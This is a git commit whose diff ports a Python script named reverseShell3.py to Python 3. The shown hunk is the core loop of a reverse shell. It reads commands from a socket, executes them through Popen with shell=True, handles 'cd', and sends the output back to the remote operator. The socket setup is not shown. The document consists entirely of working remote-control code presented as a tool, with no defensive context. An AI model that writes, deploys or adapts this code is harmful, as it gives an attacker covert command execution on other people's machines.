5c13ada4130da4003a29bd12c54e68cfcd75f47a
hnsengimana <hansnsengimana10@gmail.com>
2022-04-05 13:30:26 -0400

    a version of reverseShell that works with python3

--- reverseShell3.py
+++ reverseShell3.py
@@ -17,14 +17,14 @@ while command != "exit":
 	if command[:2] == "cd":
 		if(os.path.isdir(command[3:]) == 1):
 			os.chdir(command[3:])
-			clientSocket.send("changed directory")
+			clientSocket.send("changed directory".encode())
 		else:
-			clientSocket.send("Invalid directory path")
+			clientSocket.send("Invalid directory path".encode())
 		command = (clientSocket.recv(4064)).decode()
 	else:
 		proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
 		result, err = proc.communicate()
-		if(err != ""):
+		if(err.decode() != ""):
 			print(err)
 		clientSocket.send(result + err)
 		command = (clientSocket.recv(4064)).decode()
